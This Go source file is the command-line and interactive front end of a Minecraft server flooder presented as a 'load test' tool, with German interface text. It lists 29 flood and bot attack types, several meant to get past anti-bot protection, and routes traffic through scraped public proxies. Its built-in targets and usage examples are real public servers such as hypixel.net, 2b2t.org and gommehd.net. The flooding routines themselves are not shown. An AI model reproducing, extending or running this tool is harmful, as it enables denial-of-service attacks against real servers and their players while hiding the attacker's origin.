package main

import (
	"flag"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"loadtest/utils" // Für Logger und Error-Handling
)

func main() {
	// Command-Line Flags definieren
	var (
		mode            = flag.String("mode", "", "Test-Modus: 'loadtest' oder 'minecraft'")
		servers         = flag.String("servers", "", "Zielserver (kommasepariert, z.B. 'hypixel.net,2b2t.org')")
		workers         = flag.Int("workers", 0, "Anzahl Worker")
		rps             = flag.Int("rps", 0, "Requests/Floods pro Sekunde")
		duration        = flag.Int("duration", 0, "Testdauer in Sekunden")
		floodType       = flag.String("flood-type", "", "Minecraft Flood-Typ")
		proxyFile       = flag.String("proxy-file", "", "Pfad zur Proxy-Datei")
		proxyList       = flag.String("proxy-list", "", "Proxy-Liste (kommasepariert)")
		proxyProtocol   = flag.String("proxy-protocol", "socks5", "Proxy-Protokoll: socks5, socks4, http, https")
		useRotating     = flag.Bool("rotating", true, "Rotating Proxys verwenden")
		testProxies     = flag.Bool("test-proxies", false, "Proxys vor Verwendung testen")
		proxyScrape     = flag.Bool("proxy-scrape", false, "Proxys von ProxyScrape herunterladen")
		proxyScrapeType = flag.String("proxy-scrape-type", "all", "ProxyScrape Typ: all, socks5, http")
		debugLog        = flag.Bool("debug", false, "Debug-Logging aktivieren")
		fileLog         = flag.Bool("log-file", false, "Logging in Datei aktivieren")
		help            = flag.Bool("help", false, "Hilfe anzeigen")
	)

	flag.Parse()

	// Logging initialisieren
	logLevel := utils.LogLevelInfo
	if *debugLog {
		logLevel = utils.LogLevelDebug
	}

	// Globales Logging konfigurieren
	utils.SetGlobalLogLevel(logLevel)
	if *fileLog {
		err := utils.EnableGlobalFileLogging("logs")
		if err != nil {
			fmt.Printf("Fehler beim Aktivieren des Datei-Loggings: %v\n", err)
		}
	}

	if *help {
		printUsage()
		return
	}

	// Prüfen ob Command-Line Argumente verwendet werden
	if *mode != "" {
		runWithCommandLine(*mode, *servers, *workers, *rps, *duration, *floodType,
			*proxyFile, *proxyList, *proxyProtocol, *useRotating, *testProxies,
			*proxyScrape, *proxyScrapeType, *debugLog, *fileLog)
		return
	}

	// Normale interaktive Version
	fmt.Println("SERVER LASTTEST & MINECRAFT PINGER")
	fmt.Println(strings.Repeat("=", 60))

	testMode := selectTestMode()

	if testMode == "minecraft" {
		runMinecraftPinger()
		return
	}

	proxies, useRotatingProxies := configureProxies()

	targetServer, concurrency, requestsPerSec, testDuration, err := getServerConfig()
	if err != nil {
		utils.Error("Fehler bei der Server-Konfiguration: %v", err)
		os.Exit(1)
	}

	tester, err := NewLoadTester(targetServer, concurrency, requestsPerSec, testDuration)
	if err != nil {
		utils.Error("Fehler beim Erstellen des Load Testers: %v", err)
		os.Exit(1)
	}

	tester.useRotating = useRotatingProxies

	if len(proxies) > 0 {
		var addErrors []string
		for _, p := range proxies {
			err := tester.AddProxy(p.Protocol, p.Host, p.Port, p.Username, p.Password, "")
			if err != nil {
				addErrors = append(addErrors, fmt.Sprintf("%s:%s - %v", p.Host, p.Port, err))
			}
		}

		if len(addErrors) > 0 {
			utils.Warning("Proxy-Fehler:")
			for _, errMsg := range addErrors {
				utils.Warning("  %s", errMsg)
			}
		}

		if len(tester.proxies) == 0 {
			utils.Warning("Keine gültigen Proxys verfügbar - verwende direkte Verbindung")
		}
	}

	fmt.Println("\n" + strings.Repeat("=", 60))
	tester.Start()
}

func printUsage() {
	fmt.Println("SERVER LASTTEST & MINECRAFT PINGER - Command Line Usage")
	fmt.Println(strings.Repeat("=", 70))
	fmt.Println()
	fmt.Println("BEISPIELE:")
	fmt.Println()

	fmt.Println("1. Minecraft Server Flooder:")
	fmt.Println("   ./flooder -mode=minecraft -servers=\"hypixel.net,2b2t.org\" -workers=50 -rps=100 -duration=60 -flood-type=ultrajoin")
	fmt.Println()

	fmt.Println("2. Mit Proxy-Datei:")
	fmt.Println("   ./flooder -mode=minecraft -servers=\"hypixel.net\" -workers=20 -rps=50 -duration=30 -flood-type=motdkiller -proxy-file=\"proxies.txt\"")
	fmt.Println()

	fmt.Println("3. Mit ProxyScrape:")
	fmt.Println("   ./flooder -mode=minecraft -servers=\"gommehd.net\" -workers=30 -rps=75 -duration=45 -flood-type=cpulagger -proxy-scrape -proxy-scrape-type=socks5")
	fmt.Println()

	fmt.Println("4. Mit manueller Proxy-Liste:")
	fmt.Println("   ./flooder -mode=minecraft -servers=\"hypixel.net\" -workers=15 -rps=25 -duration=20 -flood-type=fakejoin -proxy-list=\"proxy1.com:1080,proxy2.com:1080\"")
	fmt.Println()

	fmt.Println("5. Load-Test:")
	fmt.Println("   ./flooder -mode=loadtest -servers=\"example.com:80\" -workers=100 -rps=200 -duration=30")
	fmt.Println()

	fmt.Println("6. Mit Debug-Logging:")
	fmt.Println("   ./flooder -mode=minecraft -servers=\"hypixel.net\" -workers=20 -debug -log-file")
	fmt.Println()

	fmt.Println("VERFÜGBARE FLOOD-TYPEN:")
	fmt.Println("  localhost, namenullping, bosshandler, fakepremium_join, botnullping,")
	fmt.Println("  ultrajoin, ufo, nAntibot, 2lsbypass, multikiller, aegiskiller,")
	fmt.Println("  cpulagger, destroyer, IDERROR, fakehost, proauthkiller, flood,")
	fmt.Println("  joinbots, botfucker, consola, paola, TimeOutKiller, cpuburner6,")
	fmt.Println("  cpuRipper, fakejoin, fastjoin, motdkiller, legacy_motd, byte")
	fmt.Println()

	fmt.Println("FLAGS:")
	flag.PrintDefaults()
}

func runWithCommandLine(mode, serverList string, workers, rpsVal, durationVal int,
	floodTypeVal, proxyFile, proxyList, proxyProtocol string, useRotatingProxies,
	testProxiesFlag, proxyScrapeFlag bool, proxyScrapeType string, debug, fileLog bool) {

	// Validierung der Parameter
	if serverList == "" {
		utils.Fatal("Fehler: Server müssen angegeben werden (-servers)")
	}

	if workers <= 0 {
		workers = 10
		utils.Info("Keine Worker angegeben, verwende Standardwert: %d", workers)
	}

	if rpsVal <= 0 {
		rpsVal = 50
		utils.Info("Keine RPS angegeben, verwende Standardwert: %d", rpsVal)
	}

	if durationVal <= 0 {
		durationVal = 30
		utils.Info("Keine Dauer angegeben, verwende Standardwert: %d Sekunden", durationVal)
	}

	// Proxys laden
	var proxies []ProxyConfig

	if proxyScrapeFlag {
		utils.Info("Lade Proxys von ProxyScrape (%s)...", proxyScrapeType)
		proxies = loadProxiesFromProxyScrape(proxyScrapeType)
		utils.Info("%d Proxys geladen", len(proxies))
	} else if proxyFile != "" {
		utils.Info("Lade Proxys aus Datei: %s", proxyFile)
		var err error
		proxies, err = loadProxiesFromFile(proxyFile)
		if err != nil {
			utils.Error("Konnte Proxys nicht laden: %v", err)
		} else {
			utils.Info("%d Proxys geladen", len(proxies))
		}
		// Protokoll setzen falls nicht gesetzt
		for i := range proxies {
			if proxies[i].Protocol == "" {
				proxies[i].Protocol = proxyProtocol
			}
		}
	} else if proxyList != "" {
		utils.Info("Parse manuelle Proxy-Liste...")
		proxies = parseCommandLineProxyList(proxyList, proxyProtocol)
		utils.Info("%d Proxys geparst", len(proxies))
	}

	// Proxys testen falls gewünscht
	if testProxiesFlag && len(proxies) > 0 {
		utils.Info("Teste %d Proxys...", len(proxies))
		working, _, _ := testProxiesParallel(proxies, 50)
		utils.Info("%d von %d Proxys funktionieren", len(working), len(proxies))
		proxies = working
	}

	duration := time.Duration(durationVal) * time.Second

	if mode == "minecraft" {
		runMinecraftFlooderCommandLine(serverList, workers, rpsVal, duration,
			floodTypeVal, proxies, useRotatingProxies)
	} else if mode == "loadtest" {
		runLoadTestCommandLine(serverList, workers, rpsVal, duration,
			proxies, useRotatingProxies)
	} else {
		utils.Fatal("Ungültiger Modus: %s (verwende 'loadtest' oder 'minecraft')", mode)
	}
}

func parseCommandLineProxyList(proxyList, protocol string) []ProxyConfig {
	var proxies []ProxyConfig

	proxyEntries := strings.Split(proxyList, ",")
	for _, entry := range proxyEntries {
		entry = strings.TrimSpace(entry)
		if entry == "" {
			continue
		}

		// Format: host:port oder socks5://host:port
		if strings.Contains(entry, "://") {
			parts := strings.Split(entry, "://")
			if len(parts) == 2 {
				protocol = parts[0]
				hostPort := strings.Split(parts[1], ":")
				if len(hostPort) == 2 {
					proxies = append(proxies, ProxyConfig{
						Protocol: protocol,
						Host:     hostPort[0],
						Port:     hostPort[1],
					})
				}
			}
		} else {
			hostPort := strings.Split(entry, ":")
			if len(hostPort) == 2 {
				proxies = append(proxies, ProxyConfig{
					Protocol: protocol,
					Host:     hostPort[0],
					Port:     hostPort[1],
				})
			}
		}
	}

	return proxies
}

func loadProxiesFromProxyScrape(scrapeType string) []ProxyConfig {
	var apiURL string
	var preferredProtocol string

	switch scrapeType {
	case "socks5":
		apiURL = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=1000"
		preferredProtocol = "socks5"
	case "http":
		apiURL = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=1000"
		preferredProtocol = "http"
	default:
		apiURL = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=all&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=1000"
	}

	proxies, err := downloadProxiesFromAPI(apiURL, preferredProtocol)
	if err != nil {
		utils.Error("ProxyScrape Download fehlgeschlagen: %v", err)
		return []ProxyConfig{}
	}

	return proxies
}

func runMinecraftFlooderCommandLine(serverList string, workers, rps int,
	duration time.Duration, floodTypeVal string, proxies []ProxyConfig, useRotating bool) {

	servers := strings.Split(serverList, ",")
	for i := range servers {
		servers[i] = strings.TrimSpace(servers[i])
	}

	if floodTypeVal == "" {
		floodTypeVal = "ultrajoin"
		utils.Info("Kein Flood-Typ angegeben, verwende: %s", floodTypeVal)
	}

	utils.Info("Starte Minecraft Server Flooder...")
	utils.Info("Server: %d, Worker: %d, Floods/s: %d, Dauer: %v, Typ: %s",
		len(servers), workers, rps, duration, floodTypeVal)
	utils.Info("Proxys: %d (Rotation: %v)", len(proxies), useRotating)

	flooder := NewMinecraftFlooder(servers, proxies, useRotating, workers, duration, floodTypeVal)

	// Starte mit erweiterter Fehlerbehandlung
	utils.StartWithErrorHandling(flooder)
}

func runLoadTestCommandLine(serverList string, workers, rps int,
	duration time.Duration, proxies []ProxyConfig, useRotating bool) {

	servers := strings.Split(serverList, ",")
	if len(servers) > 1 {
		utils.Warning("Load-Test unterstützt nur einen Server. Verwende: %s", servers[0])
	}

	targetServer := strings.TrimSpace(servers[0])

	tester, err := NewLoadTester(targetServer, workers, rps, duration)
	if err != nil {
		utils.Fatal("Fehler beim Erstellen des Load Testers: %v", err)
	}

	tester.useRotating = useRotating

	if len(proxies) > 0 {
		var addErrors []string
		for _, p := range proxies {
			err := tester.AddProxy(p.Protocol, p.Host, p.Port, p.Username, p.Password, "")
			if err != nil {
				addErrors = append(addErrors, fmt.Sprintf("%s:%s - %v", p.Host, p.Port, err))
			}
		}

		if len(addErrors) > 0 && len(addErrors) < 10 {
			utils.Warning("Proxy-Fehler:")
			for _, errMsg := range addErrors {
				utils.Warning("  %s", errMsg)
			}
		}

		if len(tester.proxies) == 0 {
			utils.Warning("Keine gültigen Proxys verfügbar - verwende direkte Verbindung")
		}
	}

	utils.Info("Starte Load-Test...")
	utils.Info("Server: %s, Worker: %d, RPS: %d, Dauer: %v",
		targetServer, workers, rps, duration)
	utils.Info("Proxys: %d (Rotation: %v)", len(proxies), useRotating)

	tester.Start()
}

// Bestehende Funktionen bleiben unverändert
func selectTestMode() string {
	fmt.Println("TEST MODUS AUSWAHL")
	fmt.Println(strings.Repeat("=", 30))
	fmt.Println("1. Normaler Load-Test")
	fmt.Println("2. Minecraft Server Flooder")

	choice := promptUser("Wähle Modus (1-2) [1]: ")

	switch choice {
	case "2":
		return "minecraft"
	default:
		return "loadtest"
	}
}

func runMinecraftPinger() {
	utils.Info("\nMINECRAFT SERVER FLOODER")
	utils.Info(strings.Repeat("=", 50))

	proxies, useRotating := configureProxies()
	servers := configureMinecraftServers()
	if len(servers) == 0 {
		utils.Error("Keine Server konfiguriert")
		return
	}

	floodType := selectFloodType()

	concurrencyStr := promptUser("Anzahl Worker [10]: ")
	concurrency := 10
	if concurrencyStr != "" {
		if c, err := strconv.Atoi(concurrencyStr); err == nil && c > 0 {
			concurrency = c
		}
	}

	rpsStr := promptUser("Floods pro Sekunde [50]: ")
	rps := 50
	if rpsStr != "" {
		if r, err := strconv.Atoi(rpsStr); err == nil && r > 0 {
			rps = r
		}
	}

	durationStr := promptUser("Testdauer in Sekunden [30]: ")
	duration := 30 * time.Second
	if durationStr != "" {
		if d, err := strconv.Atoi(durationStr); err == nil && d > 0 {
			duration = time.Duration(d) * time.Second
		}
	}

	utils.Info("\nStarte Minecraft Server Flooder...")
	utils.Info("Server: %d, Worker: %d, Floods/s: %d, Dauer: %v, Typ: %s",
		len(servers), concurrency, rps, duration, floodType)
	utils.Info("Proxys: %d (Rotation: %v)", len(proxies), useRotating)

	flooder := NewMinecraftFlooder(servers, proxies, useRotating, concurrency, duration, floodType)

	// Starte mit erweiterter Fehlerbehandlung
	utils.StartWithErrorHandling(flooder)
}

func selectFloodType() string {
	fmt.Println("\nFLOOD-TYP AUSWAHL")
	fmt.Println(strings.Repeat("-", 30))
	fmt.Println("  1. Localhost Attack")
	fmt.Println("  2. Name Null Ping")
	fmt.Println("  3. Boss Handler")
	fmt.Println("  4. Fake Premium Join")
	fmt.Println("  5. Bot Null Ping")
	fmt.Println("  6. Ultra Join")
	fmt.Println("  7. UFO Attack")
	fmt.Println("  8. nAntibot")
	fmt.Println("  9. 2LS Bypass")
	fmt.Println("  10. Multi Killer")
	fmt.Println("  11. Aegis Killer")
	fmt.Println("  12. CPU Lagger")
	fmt.Println("  13. Destroyer")
	fmt.Println("  14. ID Error")
	fmt.Println("  15. Fake Host")
	fmt.Println("  16. Pro Auth Killer")
	fmt.Println("  17. Standard Flood")
	fmt.Println("  18. Join Bots")
	fmt.Println("  19. Bot Fucker")
	fmt.Println("  20. Consola")
	fmt.Println("  21. Paola")
	fmt.Println("  22. TimeOut Killer")
	fmt.Println("  23. CPU Burner 6")
	fmt.Println("  24. CPU Ripper")
	fmt.Println("  25. Fake Join")
	fmt.Println("  26. Fast Join")
	fmt.Println("  27. MOTD Killer")
	fmt.Println("  28. Legacy MOTD")
	fmt.Println("  29. Byte Attack")

	floodTypes := map[string]string{
		"1":  "localhost",
		"2":  "namenullping",
		"3":  "bosshandler",
		"4":  "fakepremium_join",
		"5":  "botnullping",
		"6":  "ultrajoin",
		"7":  "ufo",
		"8":  "nAntibot",
		"9":  "2lsbypass",
		"10": "multikiller",
		"11": "aegiskiller",
		"12": "cpulagger",
		"13": "destroyer",
		"14": "IDERROR",
		"15": "fakehost",
		"16": "proauthkiller",
		"17": "flood",
		"18": "joinbots",
		"19": "botfucker",
		"20": "consola",
		"21": "paola",
		"22": "TimeOutKiller",
		"23": "cpuburner6",
		"24": "cpuRipper",
		"25": "fakejoin",
		"26": "fastjoin",
		"27": "motdkiller",
		"28": "legacy_motd",
		"29": "byte",
	}

	choice := promptUser("Wähle Flood-Typ (1-29) [6]: ")
	if choice == "" {
		choice = "6"
	}

	if floodType, exists := floodTypes[choice]; exists {
		return floodType
	}

	return "ultrajoin"
}

func configureMinecraftServers() []string {
	fmt.Println("\nSERVER KONFIGURATION")
	fmt.Println(strings.Repeat("-", 30))
	fmt.Println("1. Standard Server verwenden")
	fmt.Println("2. Eigene Server eingeben")

	choice := promptUser("Wähle Option (1-2) [1]: ")

	if choice == "2" {
		var servers []string
		fmt.Println("\nGib Minecraft Server ein (Format: host:port oder nur host)")
		fmt.Println("Leere Zeile zum Beenden:")

		for {
			server := promptUser(fmt.Sprintf("Server #%d: ", len(servers)+1))
			if server == "" {
				break
			}
			servers = append(servers, server)
		}

		return servers
	}

	return []string{
		"hypixel.net",
		"mc.hypixel.net",
		"2b2t.org",
		"mineplex.com",
		"gommehd.net",
		"cubecraft.net",
	}
}
